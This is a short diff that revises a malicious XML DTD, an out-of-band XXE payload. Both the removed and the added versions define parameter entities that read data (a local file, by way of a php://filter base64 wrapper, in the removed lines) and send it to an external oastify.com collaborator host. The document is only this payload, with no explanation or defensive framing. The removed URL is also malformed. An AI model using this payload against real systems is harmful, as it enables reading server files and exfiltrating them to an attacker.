@@ -1,3 +1,4 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">
-<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://rpkjqehjmnk1afh1ra3yly7wgnmeady2.oastify.combypass.xml?%data;'>">
-%abt;
+<!ENTITY % file SYSTEM "http://rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
